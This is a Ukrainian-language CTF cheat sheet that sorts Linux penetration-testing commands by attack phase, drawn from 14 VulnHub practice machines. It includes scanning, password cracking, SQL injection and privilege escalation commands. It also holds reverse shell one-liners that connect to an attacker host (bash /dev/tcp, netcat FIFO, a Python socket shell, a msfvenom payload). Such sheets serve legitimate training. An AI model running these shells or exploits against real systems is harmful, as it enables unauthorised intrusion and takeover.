# CTF Cheat Sheet — хід Linux-пентесту

Систематизовано з усіх 14 пройдених VulnHub VM команди. Структура за фазами атаки, а не за назвою машини — застосовна до будь-якого схожого завдання на змаганні.

**Версія:** фінальна, 14/14 машин.

**Джерела:** Bob (web RCE · GPG), C0lddBox (WordPress), Chronos (cmd injection · CVE), Corrosion2 (Tomcat · zip crack), CyberSploit (kernel exploit), DeathNote (vhost · brainfuck), DoubleTrouble (stego · SQLi · nested VM), HackMePlease (MySQL · hash swap), Jangow (FTP · LinPeas), EmpireBreakout (capabilities · Usermin), ICA1 (hashcat · PATH hijack), LazyAdmin (SMB · enum4linux), Vikings (rpyc · головоломки), MoneyBox (anon FTP · SSH key trust).

---

## 1. Розвідка та сканування

**Пошук хоста в локальній мережі**
```sh
sudo netdiscover -r 10.0.2.0/24
nmap -sn 10.0.2.0/24 -oG - | awk '/Up/{print $2}'
```
Другий варіант — альтернатива, якщо netdiscover недоступний чи гальмує.

**Швидке сканування версій сервісів**
```sh
nmap -sV <ip>
```

**Повне сканування: всі порти + скрипти + версії + файл**
```sh
nmap -sC -sV -p- -oN tcp_scan <ip>
```
`-p-` обов'язковий: за замовчуванням скануються лише топ-1000 портів, а нестандартні сервіси (напр. SSH на нестандартному порту) можна пропустити. Повільніше, але надійніше.

**-A проти окремих -sC -sV**
`-A` додає ще й OS detection та traceroute — повільніший і "гучніший" скан; `-sC -sV` достатньо для більшості CTF-завдань.

**Хост не відповідає на ping**
```sh
nmap -Pn -sV <ip>
```
`-Pn` вимикає перевірку "чи жива ціль" — обов'язково, якщо хост фільтрує ICMP/SYN.

> MAC-адреси, що починаються з `08:00:27`, — це VirtualBox VM. Корисно при netdiscover у мережі з кількома машинами, щоб відрізнити цілі від іншого.

---

## 2. Веброзвідка

**Перебір директорій/файлів**
```sh
gobuster dir -u http://<ip>/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt,zip -r
dirb http://<ip>/ -X .php,.zip
dirsearch -u http://<ip>/
```
`-x`/`-X` додає розширення до кожного слова (знаходить admin.php, backup.zip, яких немає як "каталог"). Якщо сервер на все відповідає 200 — додати `--exclude-length` у gobuster.

**Ручна перевірка завжди перед брутфорсом**
- `/robots.txt` — часто видає приховані шляхи
- View Page Source — коментарі, JS-запити до інших портів (саме так знайшли порт 8000 у Chronos) чи шляхи в JS-файлах (main.js видав шлях до SeedDMS)
- Заголовки відповіді, cookies, назви технологій

**Сайт повертає помилку з доменним іменем**
```sh
sudo nano /etc/hosts
# додати рядок: <ip> назва.vuln
```
Типово для virtual host-based застосунків — без резолву домену сайт просто не відкриється правильно.

**Шаблон конфіг-файлу видає справжній**
Якщо знайдено `settings.xml.template` чи подібне — перевірити, чи не лежить поруч реальний `settings.xml`/`config.php` з тими самими назвами полів — часто доступний напряму й містить креди у відкритому вигляді.

**CMS (WordPress)**
```sh
wpscan --url http://<ip>/ -e
```
Enumerate users/plugins/themes, потім таргетований брутфорс на знайдене ім'я.

**Відома версія CMS/ПЗ — шукати готовий експлойт**
```sh
searchsploit <продукт> <версія>
```
Інколи "експлойт" — це просто текстовий опис, який видає шлях до конфіг-файлу з кредами (а не робочий код).

---

## 2b. SMB-розвідка

**Повне SMB-сканування**
```sh
enum4linux -a <ip>
```
Видає користувачів (навіть через RID cycling на Samba), шари, політику паролів — перевіряти навіть якщо ціль на Linux.

**Анонімний доступ до шар**
```sh
smbclient -L //<ip>/ -N
smbclient //<ip>/share$ -N
```
`-N` — без пароля (null session). Часто в шарі лежать конфіги чи нотатки з кредами напряму — перевіряти перед веб-експлуатацією.

---

## 3. Паролі та брутфорс

**WordPress login brute**
```sh
wpscan --url http://<ip>/ -U <user> -P /usr/share/wordlists/rockyou.txt
```

**Запаролений zip-архів**
```sh
fcrackzip -D -p /usr/share/wordlists/rockyou.txt -u backup.zip
```
Альтернатива: `zip2john backup.zip > hash && john hash --wordlist=/usr/share/wordlists/rockyou.txt`

**Хеші паролів (/etc/shadow тощо)**
```sh
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```
rockyou.txt часто лежить у .gz: `gunzip rockyou.txt.gz` перед використанням.

**Визначити тип хешу, потім hashcat**
```sh
hashid hash.txt
hashcat -m 0 -a 0 -D 1 hash.txt /usr/share/wordlists/rockyou.txt
hashcat -m 0 -a 3 -D 1 hash.txt ?a?a?a?a?a?a --increment
```
`-m` — тип хешу (hashid підкаже), `-a 0` — словник, `-a 3` — брутфорс по масці, `-D 1` — рахувати на CPU (важливо у VM без GPU). Якщо зламані паролі схожі — скласти з них міні-словник для hydra на інших користувачів.

**Брутфорс логіна/пароля по сервісу (SSH, FTP тощо)**
```sh
hydra -L user.txt -P pass.txt <ip> ssh
```
`-L` — файл логінів, `-P` — файл паролів. Якщо гальмує чи не читає файли — спробувати medusa як альтернативу.

**MD5-хеш не ламається — підмінити його**
Є прямий доступ до БД (через SQLi чи консоль)? Не обов'язково зламувати чужий хеш: порахувати MD5 для *відомого* пароля і записати в БД замість існуючого.
```sh
echo -n "admin" | md5sum
UPDATE users SET pwd='21232f297a57a5a743894a0e4a801fc3' WHERE login='admin';
```

> Завжди пробуйте rockyou.txt першим — у більшості розібраних машин пароль або хеш ламається саме ним.

---

## 4. Знайдені файли й креди

- **Backup-файли** у веб-директоріях (.zip) — часто захищені паролем, але лежать у публічному доступі
- **Конфіги**: `wp-config.php`, `tomcat-users.xml` — часто містять креди відкритим текстом
- **Приховані файли** у домашніх каталогах: `ls -la`, шукати .txt/.html з "старими" паролями
- **Нотатки користувачів**: user.txt, note.txt, staff.txt — часто містять підказку для наступного кроку
- **Анонімний FTP**: `ftp <ip>` — логін `anonymous`, пароль порожній; перевіряти навіть якщо nmap не показав це явно — багато FTP-серверів дозволяють його за замовчуванням

**Розшифрувати GPG-файл**
```sh
gpg --batch --yes --passphrase 'PASS' -d file.gpg
```

**Прямий доступ до MySQL з кредами з конфігу**
```sh
mysql -u <user> -h <ip> --password='<pass>' --skip-ssl
show databases; use <db>; show tables; select * from <table>;
```
Вивантажити таблицю одразу на Kali замість копіювання вручну:
```sh
mysqldump -h <ip> -u <user> --password='<pass>' --skip-ssl <db> <table> > out.txt
```

---

## 5. Первинний доступ / RCE

**Форма виконання команд на сайті**
Спочатку перевіряти безпечними командами: `id`, `whoami`, `pwd` — щоб зрозуміти, від якого користувача виконується код і чи є фільтрація. Перевіряти і GET-параметри напряму (напр. `?buscar=id`) — іноді команда виконується без жодного кодування чи фільтрації.

**WordPress Theme Editor**
Appearance → Editor → footer.php або 404.php замінити на php-reverse-shell (pentestmonkey), зберегти, відкрити сторінку в браузері.

**Tomcat Manager**
```sh
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<ip> LPORT=<port> -f war -o shell.war
```
Завантажити через manager app → deploy → відкрити `/shell/`.

**Command Injection через закодований параметр**
Незрозумілий рядок у параметрі запиту — спробувати декодувати (Base64/Base58/hex). Якщо це команда — дописати `;<команда>`, закодувати назад тим самим алгоритмом, відправити. Перевірити заголовки запиту (User-Agent тощо) — сервер може вимагати специфічне значення, видно у вихідному коді/JS.

**SQL-ін'єкція через форму логіну**
Ознаки ризику: стара версія PHP/Apache, HTTP 200 на будь-які дані без чіткої помилки, відсутність CSRF/капчі. Перехопити запит у Burp, зберегти як сирий HTTP-файл, згодувати sqlmap:
```sh
sqlmap -r sql_request.txt --dbs
sqlmap -r sql_request.txt -D <db> -T <table> --columns
sqlmap -r sql_request.txt -D <db> -T <table> -C user,pass --dump
```

---

## 6. Reverse shell

**Слухач на атакуючій машині**
```sh
nc -lvnp <port>
```

**Bash one-liner**
```sh
bash -c 'bash -i >& /dev/tcp/<attacker_ip>/<port> 0>&1'
```

**FIFO-варіант (якщо /dev/tcp недоступний)**
```sh
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ip> <port> >/tmp/f
```

**Python-варіант через socket**
```sh
python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<attacker_ip>",<port>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
```

**Апгрейд до повноцінного TTY**
```sh
python3 -c 'import pty;pty.spawn("/bin/bash")'
```
Якщо python немає: `script -qc /bin/bash /dev/null`

**Перенесення файлів на/з цілі**
```sh
curl http://<ip>/file > file
wget http://<ip>/exploit.c
scp file user@<ip>:/tmp/
```
Є доступ по FTP з кредами? Можна залити скрипт (напр. LinPeas) напряму: `ftp> put linpeas.sh`

---

## 7. Горизонтальний рух

- Знайдений пароль пробувати для **всіх** виявлених користувачів, не лише того, кому він "призначений" — паролі часто повторюються
- `su <user>` та `ssh <user>@<ip>` з усіма зібраними парами логін:пароль
- Якщо SSH не спрацював — пробувати ті самі креди на **інших** знайдених сервісах (веб-адмінка, Usermin, FTP, SMB) — вхід часто дозволений лише в одному з них
- Перевіряти `~/.ssh/authorized_keys` у кожного користувача: якщо там лежить публічний ключ іншого користувача — той інший може зайти сюди без пароля (і навпаки)
- Після заходу під новим користувачем — одразу `ls -la` в домашньому каталозі й повторити `sudo -l`

---

## 8. Підвищення привілеїв

**Перший крок завжди**
```sh
sudo -l
```

**Автоматичне сканування (LinPeas)**
```sh
chmod +x linpeas.sh
./linpeas.sh >> linpeas.log
```
Знаходить SUID, capabilities, cron-завдання, читабельні конфіги тощо — запускати одразу після першого шелу, поки вручну шукаєш інше.

**GTFOBins** (`gtfobins.github.io`) — по кожному біну з sudo/SUID шукати готовий прийом:
```sh
sudo chmod 6777 /etc/passwd  # приклад: зробити файл доступним
sudo vim -c ':!/bin/bash'
sudo ftp
!/bin/bash
sudo awk 'BEGIN { system("/bin/bash") }'
sudo perl -e 'exec "/bin/bash";'
```
Якщо `sudo -l` показує `(ALL) NOPASSWD: ALL` — просто `sudo /bin/sh`, без GTFOBins.

**SUID-бінарники вручну**
```sh
find / -perm -4000 2>/dev/null
```

**Linux capabilities (альтернатива SUID)**
```sh
getcap -r / 2>/dev/null
```
Напр. `cap_dac_read_search` на бінарнику дозволяє читати будь-які файли в обхід прав — навіть /etc/shadow. Файли з обмеженим доступом root-only можна витягти через `tar` з такою можливістю: `tar -cf out.tar /шлях/до/файлу`.

**PATH hijacking**
Якщо SUID-бінарник викликає системну команду без повного шляху (видно в `strings`), підмінити команду:
```sh
strings /opt/suid_binary   # шукати виклик типу "cat", "ls" без /usr/bin/
echo "/bin/bash" > /tmp/cat
chmod +x /tmp/cat
export PATH=/tmp:$PATH
/opt/suid_binary
```

**Python library hijacking**
Якщо sudo дозволяє скрипт, що імпортує стандартний модуль (напр. `base64`) — знайти його шлях, перевірити права на запис, вставити `os.system("/bin/bash")` і запустити скрипт через sudo.
```sh
locate base64.py
ls -al /usr/lib/python3.8/base64.py
```

**Коли sudo -l і SUID нічого не дали: kernel/CVE-експлойт**
```sh
uname -a
cat /etc/issue
```
Версію ядра/ОС — у пошук і на Exploit-DB. Приклад: Dirty COW (CVE-2016-5195) для старих ядер Linux.
```sh
wget https://www.exploit-db.com/raw/<id>
gcc -pthread exploit.c -o exploit -lcrypt
./exploit
```
Останній варіант, коли все інше вичерпано; кожна версія ядра має власні флаги компіляції — читати коментарі в коді експлойту.

**Небезпечний локальний сервіс (напр. rpyc_classic)**
Скрипти, що запускаються від root і відкривають RPC-сервіс на localhost (видно в `.profile`, cron чи `ps aux`), можуть дозволити виконання коду з правами root. Наприклад, rpyc_classic.py відкритий без автентифікації дозволяє `conn.teleport(func)` — виконати довільну Python-функцію на стороні сервера. Загальна ідея: шукати відкриті localhost-порти від адмін-інструментів (rpyc, Jupyter, debug-консолі тощо) і пробувати їх відому вразливість.

---

## 9. Кодування та шифри

- **Base64:** `echo "STR" | base64 -d`
- **Base58** та інші нестандартні кодування — у Linux немає вбудованої утиліти, користуватись **CyberChef** (мати офлайн-копію!) або Python-бібліотекою `base58`
- **Двійковий код / Brainfuck / Morse** — CyberChef offline або `dcode.fr` (якщо є інтернет); визначити формат за виглядом рядка перед спробами
- Незрозумілий рядок — спершу визначити, *що* це (гуглити фрагмент, перевіряти класичні шифри: Atbash, Vigenère, Harpocrates), а вже потім брутфорсити
- **GPG:** `gpg --batch --yes --passphrase 'PASS' -d file.gpg`
- **Стеганографія в зображенні, запаролена**: `stegcracker image.jpg /usr/share/wordlists/rockyou.txt` або `steghide extract -sf image.jpg` (ввести пароль/ключеве слово, якщо відоме)
- **Вбудовані файли в зображенні** (не LSB-стеганографія, а додані дані після кінця файлу): `binwalk -e image.jpg`
- **Файл видає себе текстом, але може бути двічі закодованим**: `curl http://<ip>/file | base64 -d > out; file out` — `file` одразу покаже справжній тип (zip, image тощо)
- **Математичні/логічні головоломки** (напр. послідовність чисел за гіпотезою Коллатца) — написати короткий Python-скрипт для генерації чисел, потім перетворити числа на ASCII-символи через CyberChef

---

## 10. Мати офлайн на флешці

- Локальна копія **GTFOBins** (git clone репозиторію)
- Офлайн-збірка **CyberChef**
- `rockyou.txt` вже розпакований
- **php-reverse-shell.php** (pentestmonkey) та шпаргалка reverse-shell пейлоадів (swisskyrepo)
- `fcrackzip`, `john`, `hydra`, `gobuster`/`dirb`/`dirsearch`, `wpscan`, `sqlmap`, `msfvenom`, `stegcracker`/`stegseek`/`steghide`/`binwalk`, `hashid`, `enum4linux`, `smbclient` — перевірені й робочі в єдиному VM-образі команди
- **linpeas.sh** (в Kali: `/usr/share/peass/linpeas`) — скопіювати на ціль одразу після отримання шелу
- Якщо завдання розпаковує вкладений VM-образ (.ova) — мати готовий план port forwarding або bridged-адаптер, щоб швидко підняти другу ціль

---

## Чек-лист «застряг»

- [ ] Чи просканував `-p-` (всі 65535 портів), а не лише топ-1000?
- [ ] Чи дивився вихідний код сторінки і коментарі/JS на предмет прихованих шляхів чи портів?
- [ ] Чи перевірив robots.txt, .git, /backup, /admin, типові конфіг-файли та їхні .template-варіанти?
- [ ] Чи пробував знайдений пароль/рядок (навіть прапорець!) як пароль для інших користувачів і сервісів (web-login, SSH, zip, su)?
- [ ] Чи зробив `sudo -l` одразу після отримання шелу?
- [ ] Чи перевірив GTFOBins для кожного бінарника, дозволеного через sudo/SUID?
- [ ] Чи це взагалі не стандартний шифр/кодування, перш ніж брутфорсити вручну?
- [ ] Чи пробував дефолтні/типові креди сервісу (admin:admin тощо) перед повним брутфорсом?
- [ ] Якщо нічого не підходить для привілеїв — чи перевірив версію ядра/ОС на наявність публічного kernel-експлойта?
- [ ] Чи перевірив анонімний доступ до SMB-шар (`smbclient -N`) і FTP, перш ніж глибоко копати веб?
- [ ] Чи запустив LinPeas одразу після отримання першого шелу?
- [ ] Чи спробував анонімний вхід на FTP (`anonymous` без пароля)?
- [ ] Чи перевірив `authorized_keys` усіх користувачів на довіру SSH-ключів один до одного?

---

*Зібрано на основі власних проходжень команди: усі 14 VulnHub VM — Bob, C0lddBox, Chronos, Corrosion2, CyberSploit, DeathNote, DoubleTrouble, HackMePlease, Jangow, EmpireBreakout, ICA1, LazyAdmin, Vikings, MoneyBox.*
